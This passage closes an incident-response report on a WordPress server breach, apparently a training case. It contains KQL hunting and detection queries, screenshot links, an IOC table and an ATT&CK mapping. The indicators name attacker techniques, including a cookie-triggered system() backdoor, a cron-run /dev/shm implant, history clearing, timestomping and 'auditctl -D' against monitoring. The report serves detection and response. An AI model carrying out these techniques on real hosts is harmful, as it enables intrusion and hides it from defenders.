| distinct ErrTime = bin(OriginalTime, 1s);
let Acc = HartwellApache_CL
| where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T20:00:00Z))
| where URI has "health-check" and StatusCode == "500"
| distinct AccTime = bin(OriginalTime, 1s);
Err | extend k = 1
| join kind=inner (Acc | extend k = 1) on k
| extend OffsetSeconds = datetime_diff('second', AccTime, ErrTime)
| summarize Pairs = count(), ErrorTimes = make_set(ErrTime, 10) by OffsetSeconds
| top 5 by Pairs desc
```

</details>

<details>
<summary><b>Query 23:</b> Error log on the corrected clock, beside non-login POSTs from 192.168.1.100</summary>

File: [`queries/query-23-error-log-on-the-corrected-clock-beside.kql`](queries/query-23-error-log-on-the-corrected-clock-beside.kql) · Screenshot: [B-23](#b-23)

```kql
union
(HartwellApacheError_CL
 | where OriginalTime between (datetime(2026-10-23T00:00:00Z) .. datetime(2026-10-23T12:00:00Z))
 | extend CorrectedTime = OriginalTime + 4h
 | where Message has "session" or Message has "health-check" or Message has "Parse error"
 | project T = CorrectedTime, Source = "ApacheError (+4h)", Who = ClientIP, Detail = replace_regex(Message, @"[0-9]+", "N")),
(HartwellApache_CL
 | where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
 | where SourceIP == "192.168.1.100" and Method == "POST"
 | where URI !has "wp-login" and URI !has "wp-admin"
 | project T = OriginalTime, Source = "Apache", Who = SourceIP, Detail = strcat("POST ", tostring(split(URI, "?")[0]), " ", StatusCode))
| summarize Rows = count(), FirstSeen = min(T), LastSeen = max(T) by Source, Who, Detail
| sort by FirstSeen asc
```

</details>

<details>
<summary><b>Query 24:</b> Logging continuity and audit-rule changes around the stop attempts</summary>

File: [`queries/query-24-logging-continuity-and-audit-rule-changes-around.kql`](queries/query-24-logging-continuity-and-audit-rule-changes-around.kql) · Screenshot: [B-24](#b-24)

```kql
union
(union withsource = T HartwellSysmon_CL, HartwellAudit_CL
 | where OriginalTime between (datetime(2026-10-23T12:20:00Z) .. datetime(2026-10-23T12:35:00Z))
    or OriginalTime between (datetime(2026-10-23T14:08:00Z) .. datetime(2026-10-23T14:25:00Z))
 | summarize Events = count() by Check = strcat("1 Events per minute: ", T), Minute = bin(OriginalTime, 1m)
 | extend Detail = ""),
(HartwellAudit_CL
 | where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
 | where AuditType == "CONFIG_CHANGE"
 | summarize Events = count() by Check = "2 Audit CONFIG_CHANGE", Minute = bin(OriginalTime, 1m), Detail = replace_regex(RawLine, @"[0-9]+", "N")),
(HartwellAudit_CL
 | where OriginalTime between (datetime(2026-10-23T14:13:55Z) .. datetime(2026-10-23T16:00:00Z))
 | extend Key = extract(@'key="([^"]+)"', 1, RawLine)
 | where isnotempty(Key)
 | summarize Events = count(), Minute = min(OriginalTime) by Check = "3 Audit rule keys firing after auditctl -D", Detail = Key)
| sort by Check asc, Minute asc
```

</details>

<details>
<summary><b>Query 25:</b> Events per table, 12:20–13:50</summary>

File: [`queries/query-25-events-per-table-12-20-13-50.kql`](queries/query-25-events-per-table-12-20-13-50.kql) · Screenshot: [B-25](#b-25)

```kql
union withsource = T HartwellApache_CL, HartwellApacheError_CL, HartwellHTTPEnriched_CL, HartwellSysmon_CL, HartwellAudit_CL, HartwellSyslog_CL, HartwellAuth_CL
| extend CorrectedTime = iff(T == "HartwellApacheError_CL", OriginalTime + 4h, OriginalTime)
| where CorrectedTime between (datetime(2026-10-23T12:20:00Z) .. datetime(2026-10-23T13:50:00Z))
| summarize Events = count(), First = min(CorrectedTime), Last = max(CorrectedTime) by T, Bin = bin(CorrectedTime, 10m)
| sort by T asc, Bin asc
```

</details>

<details>
<summary><b>Query 26:</b> Hashes and event types for /dev/shm/.cache-helper and /usr/bin/sleep</summary>

File: [`queries/query-26-hashes-and-event-types-for-dev-shm.kql`](queries/query-26-hashes-and-event-types-for-dev-shm.kql) · Screenshot: [B-26](#b-26)

```kql
HartwellSysmon_CL
| where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
| where Image in ("/dev/shm/.cache-helper", "/usr/bin/sleep")
| summarize Events = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime) by Image, Hashes, RuleName, User
| sort by FirstSeen asc
```

</details>

<details>
<summary><b>Query 27:</b> SSH logins and sudo commands, 2026-10-22 to 2026-10-23</summary>

File: [`queries/query-27-ssh-logins-and-sudo-commands-2026-10.kql`](queries/query-27-ssh-logins-and-sudo-commands-2026-10.kql) · Screenshot: [B-27](#b-27)

```kql
HartwellAuth_CL
| where OriginalTime between (datetime(2026-10-22T00:00:00Z) .. datetime(2026-10-24T00:00:00Z))
| where Message has "Accepted" or Message has "COMMAND="
| extend Kind = iff(Message has "Accepted", "ssh accepted", "sudo")
| extend SrcIP = extract(@"from (\d+\.\d+\.\d+\.\d+)", 1, Message)
| extend Account = coalesce(extract(@"for (\S+) from", 1, Message), extract(@"^\s*(\S+) :", 1, Message))
| extend SshKey = extract(@"(SHA256:\S+)", 1, Message)
| extend Cmd = extract(@"COMMAND=(.*)$", 1, Message)
| summarize Events = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime), Commands = make_set(Cmd, 15)
    by Day = bin(OriginalTime, 1d), Kind, Account, SrcIP, SshKey
| sort by FirstSeen asc
```

</details>

<details>
<summary><b>Query 28:</b> Requests per source and user agent, with webshell and exploit contact</summary>

File: [`queries/query-28-requests-per-source-and-user-agent-with.kql`](queries/query-28-requests-per-source-and-user-agent-with.kql) · Screenshot: [B-28](#b-28)

```kql
HartwellApache_CL
| where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
| summarize Requests = count(), DistinctURIs = dcount(URI, 4), Methods = make_set(Method, 6), Statuses = make_set(StatusCode, 8),
    HealthCheckHits = countif(URI has "health-check"), PostsOutsideLogin = countif(Method == "POST" and URI !has "wp-login" and URI !has "wp-admin"),
    FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime)
        by SourceIP, UserAgent    
| sort by SourceIP asc, FirstSeen asc
```

</details>

<details>
<summary><b>Query 29:</b> Validation of detection D1</summary>

File: [`queries/query-29-validation-of-detection-d1.kql`](queries/query-29-validation-of-detection-d1.kql) · Screenshot: [B-29](#b-29)

```kql
HartwellApacheError_CL
| where OriginalTime between (datetime(2026-10-22T23:00:00Z) .. datetime(2026-10-23T12:00:00Z))
| extend CorrectedTime = OriginalTime + 4h
| where Message has "PHP Request Startup" and (Message has "Session ID is too long" or Message has "Failed to read session data")
| summarize Warnings = count(), FirstSeen = min(CorrectedTime), LastSeen = max(CorrectedTime) by ClientIP, Burst = bin(CorrectedTime, 10m)
| where Warnings >= 2
| sort by FirstSeen asc
```

</details>

<details>
<summary><b>Query 30:</b> Validation of detection D2</summary>

File: [`queries/query-30-validation-of-detection-d2.kql`](queries/query-30-validation-of-detection-d2.kql) · Screenshot: [B-30](#b-30)

```kql
HartwellSysmon_CL
| where OriginalTime between (datetime(2026-10-23T00:00:00Z) .. datetime(2026-10-24T00:00:00Z))
| where RuleName == "ProcessCreate"
| where ParentImage endswith "/apache2" or ParentImage has "php"
| extend Matched = User == "www-data" and (Image endswith "/sh" or Image endswith "/dash" or Image endswith "/bash")
| summarize Processes = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime), Samples = make_set(CommandLine, 5)
    by Matched, User, ParentImage, Image
| sort by Matched desc, FirstSeen asc
```

</details>

<details>
<summary><b>Query 31:</b> Validation of detection D3</summary>

File: [`queries/query-31-validation-of-detection-d3.kql`](queries/query-31-validation-of-detection-d3.kql) · Screenshot: [B-31](#b-31)

```kql
HartwellAudit_CL
| where OriginalTime between (datetime(2026-10-23T00:00:00Z) .. datetime(2026-10-24T00:00:00Z))
| where AuditType == "SYSCALL" and RawLine has "syscall=59"
| extend Exe = extract(@'exe="([^"]+)"', 1, RawLine), Account = extract(@'UID="([^"]+)"', 1, RawLine)
| extend Matched = Exe startswith "/dev/shm/" or Exe startswith "/tmp/" or Exe startswith "/var/tmp/"
| summarize Executions = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime)
    by Matched, Program = iff(Matched, Exe, "(all other paths)"), Account
| sort by Matched desc, FirstSeen asc
```

</details>

<details>
<summary><b>Query 32:</b> Every command auditd recorded between 04:34 and 05:25, before Sysmon was running</summary>

File: [`queries/query-32-every-command-auditd-recorded-between-04-34.kql`](queries/query-32-every-command-auditd-recorded-between-04-34.kql) · Screenshot: [B-32](#b-32)

```kql
HartwellAudit_CL
| where OriginalTime between (datetime(2026-10-23T04:34:00Z) .. datetime(2026-10-23T05:25:00Z))
| where AuditType in ("EXECVE", "SYSCALL")
| extend Exe = extract(@'exe="([^"]+)"', 1, RawLine), Account = extract(@'UID="([^"]+)"', 1, RawLine), Key = extract(@'key="([^"]+)"', 1, RawLine)
| extend Args = extract(@'argc=\d+ (.*)$', 1, RawLine)
| extend Detail = iff(AuditType == "EXECVE", Args, strcat(Exe, " | uid=", Account, " | key=", Key))
| summarize Count = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime) by AuditType, Detail
| sort by FirstSeen asc
```

</details>

<details>
<summary><b>Query 33:</b> Web-root writes, joined to the files they touched and the account that made them</summary>

File: [`queries/query-33-web-root-writes-joined-to-the-files.kql`](queries/query-33-web-root-writes-joined-to-the-files.kql) · Screenshot: [B-33](#b-33)

```kql
HartwellAudit_CL
| where OriginalTime between (datetime(2026-10-23T04:34:00Z) .. datetime(2026-10-23T04:40:00Z))
| where AuditType in ("SYSCALL", "PATH")
| extend Serial = extract(@"msg=audit\([0-9.]+:(\d+)\)", 1, RawLine)
| summarize Time = min(OriginalTime), Exe = take_anyif(extract(@'exe="([^"]+)"', 1, RawLine), AuditType == "SYSCALL"),
    Account = take_anyif(extract(@'UID="([^"]+)"', 1, RawLine), AuditType == "SYSCALL"),
    Key = take_anyif(extract(@'key="([^"]+)"', 1, RawLine), AuditType == "SYSCALL"),
    Paths = make_set_if(extract(@' name="([^"]+)"', 1, RawLine), AuditType == "PATH", 10)
    by Serial
| where Key == "webroot_write"
| sort by Time asc
```

</details>

<details>
<summary><b>Query 34:</b> Every command the web server ran across the window, outside the first run and the implant's cron runs</summary>

File: [`queries/query-34-every-command-the-web-server-ran-across.kql`](queries/query-34-every-command-the-web-server-ran-across.kql) · Screenshot: [B-34](#b-34)

```kql
HartwellAudit_CL
| where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
| where AuditType == "EXECVE"
| where not(OriginalTime between (datetime(2026-10-23T04:34:00Z) .. datetime(2026-10-23T04:38:00Z)))
| where RawLine !has "/dev/shm/.cache-helper"
| join kind=inner (HartwellAudit_CL
    | where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
    | where AuditType == "SYSCALL" and RawLine has 'key="php_worker_exec"'
    | extend Serial = extract(@"msg=audit\([0-9.]+:(\d+)\)", 1, RawLine)
    | project Serial) on $left.AuditSerial == $right.Serial
| summarize Count = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime) by Args = extract(@'argc=\d+ (.*)$', 1, RawLine)
| sort by FirstSeen asc
```

</details>

## Appendix B: Screenshots, IOCs, ATT&CK and References

### B.1 Screenshots

<a id="b-1"></a>
**B-1: Query 1 – Requests per source address, to identify the scanner**

![Query 1 result](images/query-01-requests-per-source-address-to-identify-the.png)

<a id="b-2"></a>
**B-2: Query 2 – User agents used by 192.168.1.100**

![Query 2 result](images/query-02-user-agents-used-by-192-168-1.png)

<a id="b-3"></a>
**B-3: Query 3 – Error-log entries from 192.168.1.100**

![Query 3 result](images/query-03-error-log-entries-from-192-168-1.png)

<a id="b-4"></a>
**B-4: Query 4 – Search of all web tables for upload_progress (no rows returned)**

![Query 4 result](images/query-04-search-of-all-web-tables-for-upload.png)

<a id="b-5"></a>
**B-5: Query 5 – Method and content type per source**

![Query 5 result](images/query-05-method-and-content-type-per-source.png)

<a id="b-7"></a>
**B-7: Query 7 – First appearance of health-check.php in each table**

![Query 7 result](images/query-07-first-appearance-of-health-check-php-in.png)

<a id="b-8"></a>
**B-8: Query 8 – Processes started by Apache or PHP, by user**

![Query 8 result](images/query-08-processes-started-by-apache-or-php-by.png)

<a id="b-9"></a>
**B-9: Query 9 – Header names on requests to health-check.php**

![Query 9 result](images/query-09-header-names-on-requests-to-health-check.png)

<a id="b-10"></a>
**B-10: Query 10 – Reversal of the header encoding for every value**

![Query 10 result](images/query-10-reversal-of-the-header-encoding-for-every.png)

<a id="b-11"></a>
**B-11: Query 11 – Network discovery commands run by www-data**

![Query 11 result](images/query-11-network-discovery-commands-run-by-www-data.png)

<a id="b-12"></a>
**B-12: Query 12 – Process, service and security-tool enumeration by www-data**

![Query 12 result](images/query-12-process-service-and-security-tool-enumeration-by.png)

<a id="b-13"></a>
**B-13: Query 13 – Configuration-file access by www-data**

![Query 13 result](images/query-13-configuration-file-access-by-www-data.png)

<a id="b-14"></a>
**B-14: Query 14 – MySQL queries run by www-data**

![Query 14 result](images/query-14-mysql-queries-run-by-www-data.png)

<a id="b-15"></a>
**B-15: Query 15 – Service-control commands run by www-data**

![Query 15 result](images/query-15-service-control-commands-run-by-www-data.png)

<a id="b-16"></a>
**B-16: Query 16 – Service stops and starts, and logging after the stop attempts**

![Query 16 result](images/query-16-service-stops-and-starts-and-logging-after.png)

<a id="b-17"></a>
**B-17: Query 17 – Persistence commands run by www-data**

![Query 17 result](images/query-17-persistence-commands-run-by-www-data.png)

<a id="b-18"></a>
**B-18: Query 18 – Every reference to /dev/shm**

![Query 18 result](images/query-18-every-reference-to-dev-shm.png)

<a id="b-19"></a>
**B-19: Query 19 – Encoding commands matched to Apache response sizes**

![Query 19 result](images/query-19-encoding-commands-matched-to-apache-response-sizes.png)

<a id="b-20"></a>
**B-20: Query 20 – Lateral-movement tools, internal addresses, network events and SSH logins**

![Query 20 result](images/query-20-lateral-movement-tools-internal-addresses-network-events.png)

<a id="b-21"></a>
**B-21: Query 21 – First and last event in each table**

![Query 21 result](images/query-21-first-and-last-event-in-each-table.png)

<a id="b-22"></a>
**B-22: Query 22 – Error-log clock offset, from parse errors matched to Apache 500s**

![Query 22 result](images/query-22-error-log-clock-offset-from-parse-errors.png)

<a id="b-23"></a>
**B-23: Query 23 – Error log on the corrected clock, beside non-login POSTs from 192.168.1.100**

![Query 23 result](images/query-23-error-log-on-the-corrected-clock-beside.png)

<a id="b-24"></a>
**B-24: Query 24 – Logging continuity and audit-rule changes around the stop attempts**

![Query 24 result](images/query-24-logging-continuity-and-audit-rule-changes-around.png)

<a id="b-25"></a>
**B-25: Query 25 – Events per table, 12:20–13:50**

![Query 25 result](images/query-25-events-per-table-12-20-13-50.png)

<a id="b-26"></a>
**B-26: Query 26 – Hashes and event types for /dev/shm/.cache-helper and /usr/bin/sleep**

![Query 26 result](images/query-26-hashes-and-event-types-for-dev-shm.png)

<a id="b-27"></a>
**B-27: Query 27 – SSH logins and sudo commands, 2026-10-22 to 2026-10-23**

![Query 27 result](images/query-27-ssh-logins-and-sudo-commands-2026-10.png)

<a id="b-28"></a>
**B-28: Query 28 – Requests per source and user agent, with webshell and exploit contact**

![Query 28 result](images/query-28-requests-per-source-and-user-agent-with.png)

<a id="b-29"></a>
**B-29: Query 29 – Validation of detection D1**

![Query 29 result](images/query-29-validation-of-detection-d1.png)

<a id="b-30"></a>
**B-30: Query 30 – Validation of detection D2**

![Query 30 result](images/query-30-validation-of-detection-d2.png)

<a id="b-31"></a>
**B-31: Query 31 – Validation of detection D3**

![Query 31 result](images/query-31-validation-of-detection-d3.png)

<a id="b-32"></a>
**B-32: Query 32 – Every command auditd recorded between 04:34 and 05:25, before Sysmon was running**

![Query 32 result](images/query-32-every-command-auditd-recorded-between-04-34.png)

<a id="b-33"></a>
**B-33: Query 33 – Web-root writes, joined to the files they touched and the account that made them**

![Query 33 result](images/query-33-web-root-writes-joined-to-the-files.png)

<a id="b-34"></a>
**B-34: Query 34 – Every command the web server ran across the window, outside the first run and the implant's cron runs**

![Query 34 result](images/query-34-every-command-the-web-server-ran-across.png)

### B.2 Indicators of Compromise

| **Type**         | **Indicator**                                                                                                            | **Context**                                                    | **Confidence**      |
|------------------|--------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------|---------------------|
| TTP              | PHP “Request Startup” session warnings in a burst from one client, alongside POST multipart/form-data to / or /index.php | Exploit runs (F1)                                              | High                |
| TTP              | A staff account’s shell writing a .php file into the web root                                                            | Webshell placed through debian (F1)                            | High                |
| TTP              | apache2 or PHP starting sh, dash or bash, with sh -c -- command lines                                                    | Webshell command execution (F2)                                | High                |
| TTP              | Custom request header carrying Base64-encoded, ROT13-encoded PHP code to a .php file                                     | Webshell command channel (F2)                                  | High                |
| TTP              | PHP code reading a cookie and passing it to system(), inserted at the top of a WordPress core file                       | Second webshell (F6)                                           | High                |
| TTP              | The web server account reading wp-config.php, then running the mysql client against wp_users                             | Credential access (F4)                                         | High                |
| TTP              | touch -r copying a legitimate file’s timestamp onto a new file; unset HISTFILE;history -c                                | Covering tracks (F5)                                           | High                |
| TTP              | systemctl stop on monitoring services, or auditctl -D, from the web server account                                       | Attempt to disable monitoring (F5)                             | High                |
| TTP              | Data dumped to /tmp, packed with tar, Base64-encoded, then deleted                                                       | Staging and return through the webshell (F7)                   | High                |
| TTP              | A program in /dev/shm run by a five-minute crontab                                                                       | Persistence (F6)                                               | High                |
| Host artefact    | /var/www/html/health-check.php                                                                                           | Webshell (F1, F2)                                              | High                |
| Host artefact    | /var/www/html/wp-includes/version.php containing \$\_COOKIE\["X-Debug-Mode"\]                                            | Cookie backdoor (F6)                                           | High                |
| Host artefact    | /dev/shm/.cache-helper (copied from /tmp/.update)                                                                        | Implant (F6)                                                   | High                |
| Host artefact    | www-data crontab entries \*/5 \* \* \* \* /dev/shm/.cache-helper and \*/5 \* \* \* \* /dev/shm/.cache-helper 300         | Persistence (F6)                                               | High                |
| Host artefact    | /tmp/.backup.tar.gz, /tmp/.db_dump.txt, /dev/shm/.wp_dump                                                                | Staging files, deleted at 04:36:59 (F7)                        | Medium: deleted     |
| Host artefact    | /var/www/html/NOTICE.txt, ransom note, reference ID HMG-2026-4891                                                        | Extortion claim (F7)                                           | High                |
| Network artefact | Request header X-HMG-Debug; cookie X-Debug-Mode                                                                          | Webshell triggers (F2, F6)                                     | High                |
| URL              | hxxp://127.0.0\[.\]1:8085/update                                                                                         | Implant download source (F6)                                   | Medium              |
| Email            | recovery_desk\[@\]protonmail\[.\]com                                                                                     | Contact address in the ransom note (F7)                        | Medium              |
| User agent       | Mozilla/5.0 (compatible; Nmap Scripting Engine; …), python-requests/2.31.0, curl/8.5.0                                   | Scanner and exploit tooling from the attacker address (F1, F8) | Low: easily changed |
| IP               | 192.168.1\[.\]100                                                                                                        | Attacker source (F1)                                           | High                |
| Account          | debian                                                                                                                   | Wrote the webshell and touched the attacker’s files (F1)       | Medium              |
| SSH key          | SHA256:3KKg2KTuBmrcaaoBtXv0x5nq4UfcqGO70g2BDJUjPKo                                                                       | Used to log in as debian from the attacker address (F8)        | Medium              |
| Credential       | wpuser database password                                                                                                 | Read and used by the attacker (F4)                             | High                |

### B.3 MITRE ATT&CK Mapping

| **Tactic**          | **Technique**                                                              | **ID**    | **Evidence ref**       |
|---------------------|----------------------------------------------------------------------------|-----------|------------------------|
| Reconnaissance      | Active Scanning: Vulnerability Scanning                                    | T1595.002 | F1; Query 2            |
| Initial Access      | Exploit Public-Facing Application                                          | T1190     | F1; Query 23           |
| Initial Access      | Valid Accounts: Local Accounts (debian; how it was obtained is not logged) | T1078.003 | F1; Query 33           |
| Persistence         | Server Software Component: Web Shell (health-check.php, version.php)       | T1505.003 | F1, F6; Query 33       |
| Execution           | Command and Scripting Interpreter: Unix Shell                              | T1059.004 | F2; Query 8, Query 32  |
| Execution           | Command and Scripting Interpreter: Python                                  | T1059.006 | F2; Query 32           |
| Defense Evasion     | Obfuscated Files or Information                                            | T1027     | F2; Query 10           |
| Discovery           | System Information Discovery                                               | T1082     | F3; Query 32           |
| Discovery           | System Owner/User Discovery                                                | T1033     | F3; Query 32           |
| Discovery           | System Network Configuration Discovery                                     | T1016     | F3; Query 11, Query 32 |
| Discovery           | System Network Connections Discovery                                       | T1049     | F3; Query 11           |
| Discovery           | Remote System Discovery (ip neigh, arp -a)                                 | T1018     | F3; Query 11, Query 32 |
| Discovery           | Security Software Discovery                                                | T1518.001 | F3; Query 12, Query 32 |
| Credential Access   | Unsecured Credentials: Credentials In Files                                | T1552.001 | F4; Query 13, Query 32 |
| Collection          | Data from Information Repositories: Databases                              | T1213.006 | F4; Query 14, Query 32 |
| Collection          | Data Staged: Local Data Staging                                            | T1074.001 | F7; Query 32           |
| Collection          | Archive Collected Data: Archive via Utility                                | T1560.001 | F7; Query 32           |
| Defense Evasion     | Impair Defenses: Disable or Modify Tools (attempted, failed)               | T1562.001 | F5; Query 15, Query 24 |
| Defense Evasion     | Indicator Removal: Timestomp                                               | T1070.006 | F5; Query 32           |
| Defense Evasion     | Indicator Removal: Clear Command History                                   | T1070.003 | F5; Query 32           |
| Defense Evasion     | Indicator Removal: File Deletion                                           | T1070.004 | F5; Query 32           |
| Command and Control | Ingress Tool Transfer                                                      | T1105     | F6; Query 32           |
| Persistence         | Scheduled Task/Job: Cron                                                   | T1053.003 | F6; Query 17, Query 32 |
| Defense Evasion     | Hide Artifacts: Hidden Files and Directories                               | T1564.001 | F6; Query 18           |
| Command and Control | Data Encoding: Standard Encoding                                           | T1132.001 | F7; Query 19, Query 32 |

Considered and left out:

- **Exfiltration Over C2 Channel (T1041):** the responses’ content is
  not recorded, so exfiltration is not proven (F7).

- **Data Encrypted for Impact (T1486):** the ransom note claims
  encryption, but no encryption command was observed (F7).

- **Remote Services (T1021):** no lateral movement was observed (F8).

### B.4 References

| **Ref** | **Source**                                                                                                                                                                                                                        |
|---------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| R1      | LOG(N) Pacific, *PHP2Shell: The Hartwell Breach* case brief, including its threat intelligence on CVE-2026-109618 / CVE-2026-109619                                                                                               |
| R2      | [NIST SP 800-61 Rev. 3, Incident Response Recommendations and Considerations for Cybersecurity Risk Management (April 2025): https://csrc.nist.gov/pubs/sp/800/61/r3/final](https://csrc.nist.gov/pubs/sp/800/61/r3/final) |
| R3      | [MITRE ATT&CK Enterprise: https://attack.mitre.org/](https://attack.mitre.org/)                                                                                                                                            |
